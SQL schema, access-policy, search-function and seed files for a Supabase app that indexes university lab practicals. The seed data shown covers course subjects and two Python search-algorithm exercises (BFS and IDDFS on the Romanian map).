-- ============================================================================
-- PRACTICAL CODE FINDER — POSTGRESQL SCHEMA (Supabase)
-- File: sql/schema.sql
-- ============================================================================

-- Enable required extensions for UUID generation and fuzzy trigram search
CREATE EXTENSION IF NOT EXISTS "pgcrypto";
CREATE EXTENSION IF NOT EXISTS "pg_trgm";

-- ----------------------------------------------------------------------------
-- Table A: subjects
-- Stores one record for each actual practical PDF subject.
-- ----------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.subjects (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name TEXT NOT NULL UNIQUE CHECK (char_length(trim(name)) > 0),
    slug TEXT NOT NULL UNIQUE CHECK (slug ~ '^[a-z0-9-]+$'),
    description TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ----------------------------------------------------------------------------
-- Table B: practicals
-- Stores every extracted practical question, original & corrected code,
-- ordered algorithm/procedure steps, expected outputs, and PDF source pages.
-- Note: Code columns (corrected_code, original_code) preserve exact line breaks
-- and indentation without automatic trimming or HTML formatting.
-- ----------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.practicals (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    source_key TEXT NOT NULL UNIQUE CHECK (char_length(trim(source_key)) > 0),
    subject_id UUID NOT NULL REFERENCES public.subjects(id) ON DELETE CASCADE,
    practical_number INTEGER CHECK (practical_number IS NULL OR practical_number > 0),
    title TEXT NOT NULL CHECK (char_length(trim(title)) > 0),
    original_question TEXT NOT NULL CHECK (char_length(trim(original_question)) > 0),
    corrected_code TEXT,
    original_code TEXT,
    programming_language TEXT,
    expected_output TEXT,
    algorithm_steps JSONB DEFAULT '[]'::jsonb,
    procedure_steps JSONB DEFAULT '[]'::jsonb,
    instructions JSONB DEFAULT '[]'::jsonb,
    keywords TEXT[] NOT NULL DEFAULT '{}'::text[],
    aliases TEXT[] NOT NULL DEFAULT '{}'::text[],
    source_pdf TEXT NOT NULL,
    source_pages INTEGER[] NOT NULL DEFAULT '{}'::integer[],
    verification_status TEXT NOT NULL DEFAULT 'verified'
        CHECK (verification_status IN ('verified', 'corrected', 'review_required', 'untested')),
    review_required BOOLEAN NOT NULL DEFAULT false,
    is_published BOOLEAN NOT NULL DEFAULT true,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- ----------------------------------------------------------------------------
-- Table C: practical_search_terms
-- Improves synonym management, alternative question wording, and search ranking.
-- ----------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS public.practical_search_terms (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    practical_id UUID NOT NULL REFERENCES public.practicals(id) ON DELETE CASCADE,
    term TEXT NOT NULL CHECK (char_length(trim(term)) > 0),
    term_type TEXT NOT NULL DEFAULT 'synonym'
        CHECK (term_type IN ('synonym', 'algorithm', 'tool', 'typo_variant', 'keyword')),
    CONSTRAINT uq_practical_term UNIQUE (practical_id, term)
);

-- ----------------------------------------------------------------------------
-- Automatic updated_at timestamp trigger for practicals
-- ----------------------------------------------------------------------------
CREATE OR REPLACE FUNCTION public.set_practicals_updated_at()
RETURNS TRIGGER
LANGUAGE plpgsql
SET search_path = public
AS $$
BEGIN
    NEW.updated_at = now();
    RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS trg_practicals_updated_at ON public.practicals;
CREATE TRIGGER trg_practicals_updated_at
BEFORE UPDATE ON public.practicals
FOR EACH ROW
EXECUTE FUNCTION public.set_practicals_updated_at();


-- ============================================================================
-- PRACTICAL CODE FINDER — ROW LEVEL SECURITY (RLS) POLICIES
-- File: sql/policies.sql
--
-- Security Model:
-- 1. Enable RLS on all public tables exposed through the Supabase Data API.
-- 2. Anonymous visitors (`anon`) and authenticated users (`authenticated`)
--    have strictly READ-ONLY (`SELECT`) access.
-- 3. Only published and reviewed practical records (`is_published = true`
--    AND `review_required = false` AND `verification_status IN ('verified', 'corrected')`)
--    are visible to public visitors.
-- 4. No `INSERT`, `UPDATE`, or `DELETE` policies exist for `anon` or
--    `authenticated`, so all client-side write attempts are rejected by
--    PostgreSQL with error code 42501.
-- ============================================================================

-- 1. Enable Row Level Security on all tables
ALTER TABLE public.subjects ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.practicals ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.practical_search_terms ENABLE ROW LEVEL SECURITY;

-- 2. Revoke write privileges from public/anon roles as defense-in-depth
REVOKE INSERT, UPDATE, DELETE, TRUNCATE ON public.subjects FROM anon, authenticated;
REVOKE INSERT, UPDATE, DELETE, TRUNCATE ON public.practicals FROM anon, authenticated;
REVOKE INSERT, UPDATE, DELETE, TRUNCATE ON public.practical_search_terms FROM anon, authenticated;

GRANT SELECT ON public.subjects TO anon, authenticated;
GRANT SELECT ON public.practicals TO anon, authenticated;
GRANT SELECT ON public.practical_search_terms TO anon, authenticated;

-- 3. Drop existing policies if re-applying
DROP POLICY IF EXISTS "Public read access to subjects" ON public.subjects;
DROP POLICY IF EXISTS "Public read access to approved practicals" ON public.practicals;
DROP POLICY IF EXISTS "Public read access to search terms of approved practicals" ON public.practical_search_terms;

-- 4. Policy: Anonymous visitors can read all subjects
CREATE POLICY "Public read access to subjects"
ON public.subjects
FOR SELECT
TO anon, authenticated
USING (true);

-- 5. Policy: Anonymous visitors can read only published, non-review-flagged practicals
CREATE POLICY "Public read access to approved practicals"
ON public.practicals
FOR SELECT
TO anon, authenticated
USING (
    is_published = true
    AND review_required = false
    AND verification_status IN ('verified', 'corrected')
);

-- 6. Policy: Anonymous visitors can read search terms linked to approved practicals
CREATE POLICY "Public read access to search terms of approved practicals"
ON public.practical_search_terms
FOR SELECT
TO anon, authenticated
USING (
    EXISTS (
        SELECT 1
        FROM public.practicals p
        WHERE p.id = practical_search_terms.practical_id
          AND p.is_published = true
          AND p.review_required = false
          AND p.verification_status IN ('verified', 'corrected')
    )
);


-- ============================================================================
-- PRACTICAL CODE FINDER — INDEXES & SERVER-SIDE SEARCH RPC
-- File: sql/indexes.sql
-- ============================================================================

CREATE EXTENSION IF NOT EXISTS "pg_trgm";

-- 1. B-Tree indexes for foreign keys, filtering, and ordering
CREATE INDEX IF NOT EXISTS idx_practicals_subject_id
    ON public.practicals (subject_id);

CREATE INDEX IF NOT EXISTS idx_practicals_practical_number
    ON public.practicals (practical_number);

CREATE INDEX IF NOT EXISTS idx_practicals_published_verified
    ON public.practicals (is_published, review_required, verification_status);

CREATE INDEX IF NOT EXISTS idx_search_terms_practical_id
    ON public.practical_search_terms (practical_id);

-- 2. GIN indexes for array membership (keywords and aliases)
CREATE INDEX IF NOT EXISTS idx_practicals_keywords_gin
    ON public.practicals USING GIN (keywords);

CREATE INDEX IF NOT EXISTS idx_practicals_aliases_gin
    ON public.practicals USING GIN (aliases);

-- 3. Trigram (pg_trgm) GIN indexes for fast partial substring & typo-tolerant matching
CREATE INDEX IF NOT EXISTS idx_practicals_question_trgm
    ON public.practicals USING GIN (original_question gin_trgm_ops);

CREATE INDEX IF NOT EXISTS idx_practicals_title_trgm
    ON public.practicals USING GIN (title gin_trgm_ops);

CREATE INDEX IF NOT EXISTS idx_practicals_language_trgm
    ON public.practicals USING GIN (programming_language gin_trgm_ops);

CREATE INDEX IF NOT EXISTS idx_search_terms_term_trgm
    ON public.practical_search_terms USING GIN (term gin_trgm_ops);

-- 4. Full-Text Search (tsvector) GIN index with weighted fields:
--    Weight A: original_question, title
--    Weight B: programming_language
--    Weight C: expected_output
CREATE INDEX IF NOT EXISTS idx_practicals_fts_gin
    ON public.practicals
    USING GIN (
        (
            setweight(to_tsvector('english', coalesce(original_question, '')), 'A') ||
            setweight(to_tsvector('english', coalesce(title, '')), 'A') ||
            setweight(to_tsvector('english', coalesce(programming_language, '')), 'B') ||
            setweight(to_tsvector('english', coalesce(expected_output, '')), 'C')
        )
    );

-- ============================================================================
-- 5. Safe Server-Side Search RPC Function: public.search_practicals
--    - Uses SECURITY INVOKER so RLS policies are always respected.
--    - Sets a strict `search_path = public, extensions` for security.
--    - Combines weighted Full-Text Search, trigram fuzzy matching, keyword/alias
--      matching, practical number matching, and subject filtering.
-- ============================================================================
CREATE OR REPLACE FUNCTION public.search_practicals(
    search_query TEXT DEFAULT '',
    subject_slug_filter TEXT DEFAULT NULL,
    result_limit INTEGER DEFAULT 20,
    result_offset INTEGER DEFAULT 0
)
RETURNS TABLE (
    id UUID,
    subject_id UUID,
    subject_name TEXT,
    subject_slug TEXT,
    practical_number INTEGER,
    title TEXT,
    original_question TEXT,
    corrected_code TEXT,
    original_code TEXT,
    programming_language TEXT,
    expected_output TEXT,
    algorithm_steps JSONB,
    procedure_steps JSONB,
    instructions JSONB,
    keywords TEXT[],
    aliases TEXT[],
    source_pdf TEXT,
    source_pages INTEGER[],
    verification_status TEXT,
    relevance_score REAL
)
LANGUAGE plpgsql
STABLE
SECURITY INVOKER
SET search_path = public
AS $$
DECLARE
    clean_query TEXT := trim(coalesce(search_query, ''));
    parsed_number INTEGER := NULL;
    safe_limit INTEGER := LEAST(GREATEST(coalesce(result_limit, 20), 1), 50);
    safe_offset INTEGER := GREATEST(coalesce(result_offset, 0), 0);
BEGIN
    -- Extract practical number if query is e.g. "Practical 3", "prac 3", or "3"
    IF clean_query ~* '^(?:practical|prac|p|exp|experiment|sr\.?\s*no\.?)?\s*#?\s*([0-9]{1,2})$' THEN
        parsed_number := (regexp_match(clean_query, '([0-9]{1,2})'))[1]::INTEGER;
    END IF;

    RETURN QUERY
    WITH ranked AS (
        SELECT
            p.id,
            p.subject_id,
            s.name AS subject_name,
            s.slug AS subject_slug,
            p.practical_number,
            p.title,
            p.original_question,
            p.corrected_code,
            p.original_code,
            p.programming_language,
            p.expected_output,
            p.algorithm_steps,
            p.procedure_steps,
            p.instructions,
            p.keywords,
            p.aliases,
            p.source_pdf,
            p.source_pages,
            p.verification_status,
            CASE
                WHEN clean_query = '' THEN 1.0::REAL
                ELSE (
                    -- 1. Exact or substring match in original_question (highest weight)
                    (CASE WHEN p.original_question ILIKE '%' || clean_query || '%' THEN 50.0 ELSE 0.0 END) +
                    -- 2. Exact or substring match in title
                    (CASE WHEN p.title ILIKE '%' || clean_query || '%' THEN 40.0 ELSE 0.0 END) +
                    -- 3. Practical number match
                    (CASE WHEN parsed_number IS NOT NULL AND p.practical_number = parsed_number THEN 45.0 ELSE 0.0 END) +
                    -- 4. Full-Text Search rank across question, title, language, output
                    (ts_rank_cd(
                        setweight(to_tsvector('english', coalesce(p.original_question, '')), 'A') ||
                        setweight(to_tsvector('english', coalesce(p.title, '')), 'A') ||
                        setweight(to_tsvector('english', coalesce(p.programming_language, '')), 'B') ||
                        setweight(to_tsvector('english', coalesce(p.expected_output, '')), 'C'),
                        websearch_to_tsquery('english', clean_query)
                    ) * 35.0) +
                    -- 5. Trigram fuzzy similarity (handles spelling mistakes and wording variations)
                    (GREATEST(
                        similarity(p.original_question, clean_query),
                        similarity(p.title, clean_query),
                        similarity(s.name, clean_query)
                    ) * 30.0) +
                    -- 6. Keyword or alias match
                    (CASE WHEN EXISTS (
                        SELECT 1 FROM unnest(p.keywords || p.aliases) AS kw
                        WHERE kw ILIKE '%' || clean_query || '%'
                           OR similarity(kw, clean_query) > 0.45
                    ) THEN 25.0 ELSE 0.0 END) +
                    -- 7. Subject name or programming language match
                    (CASE WHEN s.name ILIKE '%' || clean_query || '%' OR p.programming_language ILIKE '%' || clean_query || '%' THEN 15.0 ELSE 0.0 END) +
                    -- 8. Expected output match
                    (CASE WHEN p.expected_output ILIKE '%' || clean_query || '%' THEN 10.0 ELSE 0.0 END)
                )::REAL
            END AS score
        FROM public.practicals p
        INNER JOIN public.subjects s ON s.id = p.subject_id
        WHERE p.is_published = true
          AND p.review_required = false
          AND p.verification_status IN ('verified', 'corrected')
          AND (
              subject_slug_filter IS NULL
              OR trim(subject_slug_filter) = ''
              OR trim(subject_slug_filter) = 'all'
              OR s.slug = trim(subject_slug_filter)
          )
    )
    SELECT
        r.id,
        r.subject_id,
        r.subject_name,
        r.subject_slug,
        r.practical_number,
        r.title,
        r.original_question,
        r.corrected_code,
        r.original_code,
        r.programming_language,
        r.expected_output,
        r.algorithm_steps,
        r.procedure_steps,
        r.instructions,
        r.keywords,
        r.aliases,
        r.source_pdf,
        r.source_pages,
        r.verification_status,
        r.score AS relevance_score
    FROM ranked r
    WHERE clean_query = '' OR r.score >= 6.5
    ORDER BY
        r.score DESC,
        r.subject_name ASC,
        r.practical_number ASC NULLS LAST
    LIMIT safe_limit
    OFFSET safe_offset;
END;
$$;

GRANT EXECUTE ON FUNCTION public.search_practicals(TEXT, TEXT, INTEGER, INTEGER) TO anon, authenticated;


-- ============================================================================
-- PRACTICAL CODE FINDER — COMPLETE SEED & IMPORT SQL
-- File: sql/seed_import_notes.sql
--
-- Instructions:
-- 1. Open your Supabase Project Dashboard (https://supabase.com/dashboard/project/epmjvlgcgsvhylaskabn)
-- 2. Go to SQL Editor -> New Query.
-- 3. Paste and run this file (sql/seed_import_notes.sql) to insert all 4 subjects
--    and all 39 extracted practicals safely (includes source_key and RLS policies).
-- ============================================================================

BEGIN;

-- 0. Ensure source_key column and compatible check constraints exist on public.practicals
ALTER TABLE public.practicals ADD COLUMN IF NOT EXISTS source_key TEXT;
DO $$
DECLARE
    r RECORD;
BEGIN
    -- Drop any overly restrictive check constraints on verification_status or term_type before re-adding
    FOR r IN
        SELECT con.conname, rel.relname
        FROM pg_constraint con
        JOIN pg_class rel ON rel.oid = con.conrelid
        JOIN pg_namespace nsp ON nsp.oid = rel.relnamespace
        WHERE nsp.nspname = 'public'
          AND rel.relname IN ('practicals', 'practical_search_terms')
          AND con.contype = 'c'
          AND (
              pg_get_constraintdef(con.oid) ILIKE '%verification_status%'
              OR pg_get_constraintdef(con.oid) ILIKE '%term_type%'
          )
    LOOP
        EXECUTE format('ALTER TABLE public.%I DROP CONSTRAINT IF EXISTS %I', r.relname, r.conname);
    END LOOP;
END $$;

ALTER TABLE public.practicals
    ADD CONSTRAINT chk_practicals_verification_status
    CHECK (verification_status IN ('verified', 'corrected', 'review_required', 'untested'));

ALTER TABLE public.practical_search_terms
    ADD CONSTRAINT chk_search_terms_term_type
    CHECK (term_type IN ('synonym', 'algorithm', 'tool', 'typo_variant', 'keyword'));

CREATE UNIQUE INDEX IF NOT EXISTS uq_practicals_source_key ON public.practicals (source_key);

-- 1. Upsert Subjects (4 Subjects)
INSERT INTO public.subjects (id, name, slug, description)
VALUES (
    '11111111-1111-4111-8111-111111111101',
    $name$Artificial Intelligence$name$,
    $slug$artificial-intelligence$slug$,
    $desc$Search algorithms (BFS, IDDFS, A*, RBFS) on the Romanian Map Problem, Decision Trees, Naive Bayes (Restaurant Waiting Problem), Backpropagation Neural Networks, AdaBoost, and Reinforcement Learning.$desc$
)
ON CONFLICT (slug) DO UPDATE SET
    name = EXCLUDED.name,
    description = EXCLUDED.description;

INSERT INTO public.subjects (id, name, slug, description)
VALUES (
    '22222222-2222-4222-8222-222222222202',
    $name$Ethical Hacking$name$,
    $slug$ethical-hacking$slug$,
    $desc$WHOIS reconnaissance, RC4 & MD5 password cracking (CrypTool, Cain & Abel), Linux network analysis & ARP poisoning (Ettercap), Nmap port scanning, Wireshark & Slowloris DoS, Stored XSS (DVWA), Session Impersonation, SQL Injection, Python Keylogger, and Metasploit exploitation.$desc$
)
ON CONFLICT (slug) DO UPDATE SET
    name = EXCLUDED.name,
    description = EXCLUDED.description;

INSERT INTO public.subjects (id, name, slug, description)
VALUES (
    '33333333-3333-4333-8333-333333333303',
    $name$Software Testing and Quality Assurance$name$,
    $slug$stqa$slug$,
    $desc$Selenium IDE test suites and assertions, Selenium RC / WebDriver setup in Eclipse, automated web login, Excel student record manipulation with JXL & TestNG, web link/object counting, combo box item counting, checkbox/radio counting, and Apache JMeter load testing.$desc$
)
ON CONFLICT (slug) DO UPDATE SET
    name = EXCLUDED.name,
    description = EXCLUDED.description;

INSERT INTO public.subjects (id, name, slug, description)
VALUES (
    '44444444-4444-4444-8444-444444444404',
    $name$Cryptography and Network Security$name$,
    $slug$cryptography-and-network-security$slug$,
    $desc$Substitution & Transposition ciphers, RSA encryption/decryption (PKCS1_OAEP), MD5 Message Authentication Code, RSA SHA-256 digital signatures, Diffie-Hellman key exchange, IPSec in Cisco Packet Tracer, SSL/TLS socket client, OpenCV Intrusion Detection System, Malware analysis with VirusTotal, and Windows Defender Firewall rule filtering.$desc$
)
ON CONFLICT (slug) DO UPDATE SET
    name = EXCLUDED.name,
    description = EXCLUDED.description;

-- 2. Upsert Practicals (39 Extracted Practicals across 4 Subjects with source_key)
-- [Artificial Intelligence] Practical 1: Breadth First Search (BFS) Algorithm for Romanian Map Problem (source_key: artificial-intelligence-practical-1)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000001',
    $skey$artificial-intelligence-practical-1$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    1,
    $title$Breadth First Search (BFS) Algorithm for Romanian Map Problem$title$,
    $q$Implement the Breadth First Search algorithm to solve a given problem.$q$,
    $code$import queue as Q
from RMP import dict_gn

start = 'Arad'
goal = 'Bucharest'
result = ''

def BFS(city, cityq, visitedq):
    global result
    if city == start:
        result = result + ' ' + city
    for eachcity in dict_gn[city].keys():
        if eachcity == goal:
            result = result + ' ' + eachcity
            return
        if eachcity not in cityq.queue and eachcity not in visitedq.queue:
            cityq.put(eachcity)
            result = result + ' ' + eachcity
    visitedq.put(city)
    BFS(cityq.get(), cityq, visitedq)

def main():
    cityq = Q.Queue()
    visitedq = Q.Queue()
    BFS(start, cityq, visitedq)
    print("BFS Traversal from ", start, " to ", goal, " is: ")
    print(result)

main()$code$,
    $orig$import queue as Q
fromRMP import dict_gn

start='Arad'
goal='Bucharest'
result=''

def BFS(city, cityq, visitedq):
    globalresult
    if city==start:
        result=result+' '+city
    for eachcity in dict_gn[city].keys():
        if eachcity==goal:
            result=result+' '+eachcity
            return
        if eachcity not in cityq.queue and eachcity not in visitedq.queue:
            cityq.put(eachcity)
            result=result+' '+eachcity
    visitedq.put(city)
    BFS(cityq.get(),cityq,visitedq)

def main():
    cityq=Q.Queue()
    visitedq=Q.Queue()
    BFS(start, cityq, visitedq)
    print("BFS Traversal from ",start," to ",goal," is: ")
    print(result)

main()$orig$,
    $lang$Python$lang$,
    $out$BFS Traversal from  Arad  to  Bucharest  is: 
 Arad Zerind Timisoara Sibiu Oradea Lugoj Rimnicu Fagaras Mehadia Pitesti Craiova Bucharest$out$,
    $json$["Import the adjacency dictionary dict_gn from RMP.py and queue module as Q.","Initialize start city as \"Arad\", goal city as \"Bucharest\", and empty traversal string result.","Create two FIFO queues: cityq (frontier queue) and visitedq (explored queue).","In BFS(city, cityq, visitedq), append the start city to result on first visit.","Iterate over each neighbor eachcity in dict_gn[city].keys(): if eachcity == goal, append to result and return.","If eachcity is not in cityq.queue and not in visitedq.queue, enqueue eachcity into cityq and append to result.","Mark current city as visited by putting it in visitedq, then recursively call BFS with cityq.get()."]$json$::jsonb,
    $json$["Save the shared Romanian Map dictionary as RMP.py in the same directory.","Create AIp1.py with the Breadth First Search implementation.","Run python AIp1.py to print the BFS traversal order from Arad to Bucharest."]$json$::jsonb,
    $json$["Requires RMP.py in the same directory containing dict_gn (Romanian Map Problem graph).","Conservative correction applied: fixed OCR concatenated keywords (fromRMP -> from RMP, globalresult -> global result) and restored line breaks inside statements.","# Common File: RMP.py (Pages 2-3 of final_AI__3f2816a9.pdf)\ndict_hn = {\n    'Arad': 336, 'Bucharest': 0, 'Craiova': 160, 'Drobeta': 242, 'Eforie': 161,\n    'Fagaras': 176, 'Giurgiu': 77, 'Hirsova': 151, 'Iasi': 226, 'Lugoj': 244,\n    'Mehadia': 241, 'Neamt': 234, 'Oradea': 380, 'Pitesti': 100, 'Rimnicu': 193,\n    'Sibiu': 253, 'Timisoara': 329, 'Urziceni': 80, 'Vaslui': 199, 'Zerind': 374\n}\n\ndict_gn = dict(\n    Arad=dict(Zerind=75, Timisoara=118, Sibiu=140),\n    Bucharest=dict(Urziceni=85, Giurgiu=90, Pitesti=101, Fagaras=211),\n    Craiova=dict(Drobeta=120, Pitesti=138, Rimnicu=146),\n    Drobeta=dict(Mehadia=75, Craiova=120),\n    Eforie=dict(Hirsova=86),\n    Fagaras=dict(Sibiu=99, Bucharest=211),\n    Giurgiu=dict(Bucharest=90),\n    Hirsova=dict(Eforie=86, Urziceni=98),\n    Iasi=dict(Neamt=87, Vaslui=92),\n    Lugoj=dict(Mehadia=70, Timisoara=111),\n    Mehadia=dict(Lugoj=70, Drobeta=75),\n    Neamt=dict(Iasi=87),\n    Oradea=dict(Zerind=71, Sibiu=151),\n    Pitesti=dict(Rimnicu=97, Bucharest=101, Craiova=138),\n    Rimnicu=dict(Sibiu=80, Pitesti=97, Craiova=146),\n    Sibiu=dict(Rimnicu=80, Fagaras=99, Arad=140, Oradea=151),\n    Timisoara=dict(Lugoj=111, Arad=118),\n    Urziceni=dict(Bucharest=85, Hirsova=98, Vaslui=142),\n    Vaslui=dict(Iasi=92, Urziceni=142),\n    Zerind=dict(Oradea=71, Arad=75)\n)"]$json$::jsonb,
    ARRAY[$item$bfs$item$, $item$breadth first search$item$, $item$romanian map$item$, $item$arad$item$, $item$bucharest$item$, $item$uninformed search$item$, $item$queue$item$, $item$rmp.py$item$]::text[],
    ARRAY[$item$AI Practical 1$item$, $item$Breadth First Search in Python$item$, $item$BFS Arad to Bucharest$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 2, 3, 4, 5]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Artificial Intelligence] Practical 2: Iterative Deepening Depth First Search (IDDFS) Algorithm (source_key: artificial-intelligence-practical-2)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000002',
    $skey$artificial-intelligence-practical-2$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    2,
    $title$Iterative Deepening Depth First Search (IDDFS) Algorithm$title$,
    $q$Implement the Iterative Depth First Search algorithm to solve the same problem.$q$,
    $code$import queue as Q
from RMP import dict_gn

start = 'Arad'
goal = 'Bucharest'
result = ''

def DLS(city, visitedstack, startlimit, endlimit):
    global result
    found = 0
    result = result + city + ' '
    visitedstack.append(city)
    if city == goal:
        return 1
    if startlimit == endlimit:
        return 0
    for eachcity in dict_gn[city].keys():
        if eachcity not in visitedstack:
            found = DLS(eachcity, visitedstack, startlimit + 1, endlimit)
            if found:
                return found

def IDDFS(city, visitedstack, endlimit):
    global result
    for i in range(0, endlimit):
        print("Searching at Limit: ", i)
        found = DLS(city, visitedstack, 0, i)
        if found:
            print("Found")
            break
        else:
            print("Not Found!")
            print(result)
            print("-----")
            result = ' '
            visitedstack = []

def main():
    visitedstack = []
    IDDFS(start, visitedstack, 9)
    print("IDDFS Traversal from ", start, " to ", goal, " is: ")
    print(result)

main()$code$,
    $orig$import queue as Q
fromRMP import dict_gn
start='Arad'
goal='Bucharest'
result=''
def DLS(city, visitedstack, startlimit, endlimit):
    global result
    found=0
    result=result+city+' '
    visitedstack.append(city)
    if city==goal:
        return 1
    ifstartlimit==endlimit:
        return 0
    for eachcity in dict_gn[city].keys():
        if eachcity not in visitedstack:
            found=DLS(eachcity, visitedstack, startlimit+1, endlimit)
            if found:
                return found
defIDDFS(city, visitedstack, endlimit):
    global result
    for i in range(0, endlimit):
        print("Searching at Limit: ",i)
        found=DLS(city, visitedstack, 0, i)
        if found:
            print("Found ")
            break
        else:
            print("Not Found! "
            print(result)
            print("--- ")
            result=' '
            visitedstack[]
def main():
    visitedstack=[]
    IDDFS(start, visitedstack, 9)
    print("IDDFS Traversal from ",start," to ", goal," is: ")
    print(result)
main()$orig$,
    $lang$Python$lang$,
    $out$Searching at Limit:  0
Not Found!
Arad 
-----
Searching at Limit:  1
Not Found!
 Arad Zerind Timisoara Sibiu 
-----
Searching at Limit:  2
Not Found!
 Arad Zerind Oradea Timisoara Lugoj Sibiu Rimnicu Fagaras 
-----
Searching at Limit:  3
Not Found!
 Arad Zerind Oradea Sibiu Timisoara Lugoj Mehadia 
-----
Searching at Limit:  4
Not Found!
 Arad Zerind Oradea Sibiu Rimnicu Fagaras Timisoara Lugoj Mehadia Drobeta 
-----
Searching at Limit:  5
Found
IDDFS Traversal from  Arad  to  Bucharest  is: 
 Arad Zerind Oradea Sibiu Rimnicu Pitesti Craiova Fagaras Bucharest$out$,
    $json$["Define Depth-Limited Search DLS(city, visitedstack, startlimit, endlimit) that appends city to result and visitedstack.","Return 1 if city == goal; return 0 if startlimit == endlimit.","For each unvisited neighbor in dict_gn[city], recursively invoke DLS with startlimit + 1.","Define IDDFS(city, visitedstack, endlimit) that iterates depth limit i from 0 to endlimit - 1.","At each depth limit i, run DLS(city, visitedstack, 0, i); if goal is found, break and print the final traversal.","Otherwise print \"Not Found!\", print the partial traversal result, and reset result and visitedstack."]$json$::jsonb,
    $json$["Ensure RMP.py is present in the same directory.","Save the program as AIp2.py and execute it with Python 3."]$json$::jsonb,
    $json$["Requires RMP.py in the same folder.","Conservative syntax fixes applied to PDF source: fixed missing spaces in fromRMP, ifstartlimit, defIDDFS, missing closing parenthesis on print(\"Not Found!\"), and visitedstack[] -> visitedstack = [].","# Common File: RMP.py (Pages 2-3 of final_AI__3f2816a9.pdf)\ndict_hn = {\n    'Arad': 336, 'Bucharest': 0, 'Craiova': 160, 'Drobeta': 242, 'Eforie': 161,\n    'Fagaras': 176, 'Giurgiu': 77, 'Hirsova': 151, 'Iasi': 226, 'Lugoj': 244,\n    'Mehadia': 241, 'Neamt': 234, 'Oradea': 380, 'Pitesti': 100, 'Rimnicu': 193,\n    'Sibiu': 253, 'Timisoara': 329, 'Urziceni': 80, 'Vaslui': 199, 'Zerind': 374\n}\n\ndict_gn = dict(\n    Arad=dict(Zerind=75, Timisoara=118, Sibiu=140),\n    Bucharest=dict(Urziceni=85, Giurgiu=90, Pitesti=101, Fagaras=211),\n    Craiova=dict(Drobeta=120, Pitesti=138, Rimnicu=146),\n    Drobeta=dict(Mehadia=75, Craiova=120),\n    Eforie=dict(Hirsova=86),\n    Fagaras=dict(Sibiu=99, Bucharest=211),\n    Giurgiu=dict(Bucharest=90),\n    Hirsova=dict(Eforie=86, Urziceni=98),\n    Iasi=dict(Neamt=87, Vaslui=92),\n    Lugoj=dict(Mehadia=70, Timisoara=111),\n    Mehadia=dict(Lugoj=70, Drobeta=75),\n    Neamt=dict(Iasi=87),\n    Oradea=dict(Zerind=71, Sibiu=151),\n    Pitesti=dict(Rimnicu=97, Bucharest=101, Craiova=138),\n    Rimnicu=dict(Sibiu=80, Pitesti=97, Craiova=146),\n    Sibiu=dict(Rimnicu=80, Fagaras=99, Arad=140, Oradea=151),\n    Timisoara=dict(Lugoj=111, Arad=118),\n    Urziceni=dict(Bucharest=85, Hirsova=98, Vaslui=142),\n    Vaslui=dict(Iasi=92, Urziceni=142),\n    Zerind=dict(Oradea=71, Arad=75)\n)"]$json$::jsonb,
    ARRAY[$item$iddfs$item$, $item$iterative deepening$item$, $item$depth first search$item$, $item$dls$item$, $item$depth limited search$item$, $item$arad$item$, $item$bucharest$item$, $item$rmp.py$item$]::text[],
    ARRAY[$item$AI Practical 2$item$, $item$Iterative Depth First Search$item$, $item$IDDFS Python Program$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 2, 3, 6, 7, 8]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

